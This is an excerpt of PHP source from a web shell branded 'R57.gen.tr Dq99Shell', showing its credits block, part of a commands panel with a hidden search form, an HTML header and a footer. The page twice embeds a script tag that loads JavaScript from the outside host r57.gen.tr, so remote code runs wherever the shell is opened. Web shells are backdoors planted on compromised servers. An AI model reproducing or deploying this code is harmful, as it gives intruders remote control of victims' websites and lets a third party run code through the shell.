...
if ($act == "about") {
  echo "<center><b>Credits:</b><br>Idea, leading and coding by <b>tristram [CCTeaM]</b><br>".
       ...
       "Report bugs to <a href=\"mailto:thesabotaqe@gmail.com\">R57.gen.tr</a></b>";
}
echo "</td></tr></table>\n";
/*** COMMANDS PANEL ***/
?>
...
<td><form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>">
    ...
    </form><SCRIPT SRC=http://r57.gen.tr/yazciz/ciz.js></SCRIPT>
    </td></tr>
...
<SCRIPT SRC=http://r57.gen.tr/yazciz/ciz.js></SCRIPT>
<body>
<div class=bartitle><h4>'.sh_name().'</h4>.: R57.gen.tr Dq99Shell :.</div>
';
return $html_start;
};
function footer() {
  echo "<div class=bartitle colspan=2><font size=1 color=#00FF00> By www.r57.gen.tr, © 2008 FeeLCoMz Community, Generated: ".round(getmicrotime()-starttime,4)." seconds</font></div>";
}
